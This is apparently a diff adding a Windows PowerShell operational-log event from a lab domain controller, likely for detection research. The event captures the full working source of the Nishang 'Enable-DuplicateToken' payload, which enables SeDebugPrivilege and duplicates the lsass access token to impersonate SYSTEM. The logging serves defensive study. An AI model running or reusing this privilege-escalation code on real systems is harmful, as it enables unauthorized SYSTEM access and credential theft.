+    } 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID_AND_ATTRIBUTES { 
+       public LUID Luid; 
+       public UInt32 Attributes; 
+    } 
+ 
+ 
+    public struct TOKEN_PRIVILEGES { 
+      public UInt32 PrivilegeCount; 
+      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
+      public LUID_AND_ATTRIBUTES [] Privileges; 
+    } 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
+        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
+ 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+    [return: MarshalAs(UnmanagedType.Bool)] 
+    public static extern bool SetThreadToken( 
+      IntPtr PHThread, 
+      IntPtr Token 
+    ); 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     [return: MarshalAs(UnmanagedType.Bool)] 
+      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
+       UInt32 DesiredAccess, out IntPtr TokenHandle); 
+ 
+    [DllImport("advapi32.dll", SetLastError = true)] 
+    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
+ 
+    [DllImport("kernel32.dll", ExactSpelling = true)] 
+    public static extern IntPtr GetCurrentProcess(); 
+ 
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
+     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
+     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
+"@ 
+ 
+  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
+  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
+    Write-Warning "Run the Command as an Administrator" 
+    Break 
+  } 
+ 
+  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
+  $adjPriv = [AdjPriv.AdjPriv] 
+  [long]$luid = 0 
+ 
+  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
+  $tokPriv1Luid.Count = 1 
+  $tokPriv1Luid.Luid = $luid 
+  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
+ 
+  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
+  
+  [IntPtr]$htoken = [IntPtr]::Zero 
+  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
+   
+   
+  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
+  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
+ 
+  if(-not($retVal)) { 
+    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
+    Break 
+  } 
+ 
+  $process = (Get-Process -Name lsass) 
+  #$process.name
+  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
+  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
+ 
+  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
+  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
+  
+  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
+  
+  if(-not($retVal)) { 
+    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
+  } 
+}
+
+
+Enable-DuplicateToken
+
+ScriptBlock ID: fc60325e-d840-48d5-968c-bca8268b7229
+Path: C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4104</EventID>
+    <Version>1</Version>
+    <Level>3</Level>
+    <Task>2</Task>
+    <Opcode>15</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:19.827477200Z" />
+    <EventRecordID>14336</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0000-3f47-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">
+
+function Enable-DuplicateToken 
+{
+&lt;# 
+.SYNOPSIS 
+Nishang payload which duplicates the Access token of lsass and sets it in the current process thread. 
+ 
+.DESCRIPTION 
+This payload duplicates the Access token of lsass and sets it in the current process thread. 
+The payload must be run with elevated permissions. 
+
+.EXAMPLE 
+PS &gt; Enable-DuplicateToken
+ 
+.LINK 
+http://www.truesec.com 
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
+https://github.com/samratashok/nishang
+
+.NOTES 
+Goude 2012, TreuSec 
+#&gt;  
+    [CmdletBinding()] 
+    param() 
+ 
+    $signature = @" 
+    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
+     public struct TokPriv1Luid 
+     { 
+         public int Count; 
+         public long Luid; 
+         public int Attr; 
+     } 
+ 
+    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
+    public const int TOKEN_QUERY = 0x00000008; 
+    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
+    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
+ 
+    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
+    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
+    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
+    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
+    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
+    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
+    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
+    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
+    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
+    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
+      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
+      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
+      TOKEN_ADJUST_SESSIONID); 
+ 
+    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
+    public const int ANYSIZE_ARRAY = 1; 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID 
+    { 
+      public UInt32 LowPart; 
+      public UInt32 HighPart; 
+    } 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID_AND_ATTRIBUTES { 
+       public LUID Luid; 
+       public UInt32 Attributes; 
+    } 
+ 
+ 
+    public struct TOKEN_PRIVILEGES { 
+      public UInt32 PrivilegeCount; 
+      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
+      public LUID_AND_ATTRIBUTES [] Privileges; 
+    } 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
+        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
+ 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+    [return: MarshalAs(UnmanagedType.Bool)] 
+    public static extern bool SetThreadToken( 
+      IntPtr PHThread, 
+      IntPtr Token 
+    ); 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     [return: MarshalAs(UnmanagedType.Bool)] 
+      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
+       UInt32 DesiredAccess, out IntPtr TokenHandle); 
+ 
+    [DllImport("advapi32.dll", SetLastError = true)] 
+    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
+ 
+    [DllImport("kernel32.dll", ExactSpelling = true)] 
+    public static extern IntPtr GetCurrentProcess(); 
+ 
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
+     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
+     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
+"@ 
+ 
+  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
+  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
+    Write-Warning "Run the Command as an Administrator" 
+    Break 
+  } 
+ 
+  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
+  $adjPriv = [AdjPriv.AdjPriv] 
+  [long]$luid = 0 
+ 
+  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
+  $tokPriv1Luid.Count = 1 
+  $tokPriv1Luid.Luid = $luid 
+  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
+ 
+  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
+  
+  [IntPtr]$htoken = [IntPtr]::Zero 
+  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
+   
+   
+  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
+  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
+ 
+  if(-not($retVal)) { 
+    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
+    Break 
+  } 
+ 
+  $process = (Get-Process -Name lsass) 
+  #$process.name
+  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
+  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
+ 
+  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
+  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
+  
+  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
+  
+  if(-not($retVal)) { 
+    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
+  } 
+}
+
+
+Enable-DuplicateToken</Data>
+    <Data Name="ScriptBlockId">fc60325e-d840-48d5-968c-bca8268b7229</Data>
+    <Data Name="Path">C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1</Data>
+  </EventData>
+</Event>
